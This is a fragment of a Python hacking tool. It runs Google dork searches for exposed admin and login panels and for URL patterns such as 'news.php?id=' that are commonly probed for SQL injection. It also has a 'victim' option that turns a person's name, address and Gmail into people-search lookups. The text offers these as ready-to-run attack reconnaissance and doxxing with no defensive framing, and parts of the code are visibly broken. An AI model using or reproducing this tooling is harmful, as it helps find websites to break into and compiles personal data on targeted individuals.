        for dor in dork:
            try:
                rand_user = random.choice(user_agents)
                file_exists = ('.google-cookie')
                if file_exists == True:
                    os.remove('.google-cookie')
                print(f'\033[1;94m[ + ]Scanning {target} With Dork {dor}[ + ]')
                for results in search(f'{dor} {target}', tld='com', num=2, start=0, stop=None, pause=2):
                    print(success + f'Found ! ', results)
                else:
                    print(info + f'Not Found. Please Wait...')
                    print(info + f'Result [This is just for a test]: ', results)
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
    elif choice.startswith("3"):
        pass
        print(info + f'IF U WANT TO FILL THE NAME, WRITE THE NAME LIKE THIS : HagaHah NOT LIKE THIS : Haga Hah')
        victm = input(f'\nName Target [Recommended To Use Full Name] : ')
        victm_addrs = input(f'\nTarget Address[Skip If U Dont Know] : ')
        victm_mails = input(f'\nGmail Target : ')
        print("Please Wait While Processing..")
        
        sites = (f'https://thatsthem.com/name/{victm}/{victm_addrs}')
        sites2 = (f'https://thatsthem.com/email/{victm_mails}')
        print(f'Try To Get Here:')
        print(sites)
        print(sites2)
        exit()
elif answer.startswith("9"):
    pass
    print("1. Dork Admin")
    print("2. Basic Dorking")
    choiche = input(f'choice : ')
    
    if choiche.startswith("1"):
        pass
        site = input(f'site [example : in (india)]: ')
        requ = 1
        requ = requ + 1
        dork_adm = ['inurl  : admin.php', 'inurl : admin/dashboard.php', 'inurl : cp.php', 'inurl : admin/cp.php', 'inurl : admin/controlpanel.php', 'inurl : admin/cpanel.php', 'inurl : admin.html', 'inurl : admin/dashboard.html', 'inurl : admin/cp.html', 'inurl : admin/cpanel.html', 'inurl : admin/controlpanel.html', 'inurl: admin/dashboard', 'inurl : admin/login.php', 'inurl : administrator.php', 'inurl : administrator.html', 'inurl : admin/login', 'inurl : wp-admin', 'inurl : wp-login.php', 'inurl : admin/dashboardd', 'intext : Welcome To Dashboard', 'intext : admin', 'intext : control.php', 'intext : controlpanel', 'intext : edit_files']
        for dorking in dork_adm:
            try:
                for admin in search(f'site :{site} \t {dorking}', tld='com', num=1, start=0, stop=None, pause=2):
                    print(success + f'Results : ')
                    print(admin)
                else:
                    print(info + f'Finding ...')
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
    elif choiche.startswith("2"):
        pass
        site = input(f'site [example : in (india)]: ')
        requ = 1
        requ = requ + 1
        dork_basc = ['about.php?cartID=', 'accinfo.php?cartId=', 'acclogin.php?cartID=', 'add.php?bookid=', 'add_cart.php?num=', 'addcart.php?', 'addItem.php', 'add-to-cart.php?ID=', 'addToCart.php?idProduct=', 'addtomylist.php?ProdId=', 'adminEditProductFields.php?intProdID=', 'advSearch_h.php?idCategory=', 'affiliate.php?ID=', 'affiliate-agreement.cfm?storeid=', 'cart_additem.php?id=', 'cartadd.php?id=', 'catalog_main.php?catid=', 'customerService.php?****ID1=', 'display_item.php?id=', 'news.php?id=', 'productDetails.php?idProduct=', 'Select_Item.php?id=', 'productsByCategory.php?intCatalogID=', 'prodView.php?idProduct=', 'productDetails.php?idProduct=']
        for dorking2 in dork_basc:
            try:
                for reslut in search(f'site :{site} \t {dorking2}', tld='com', num=1, start=0, stop=None, pause=2):
                    print(success + f'Results : ')
                    print(reslut)
                else:
                    print(info + f'Finding ...')
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)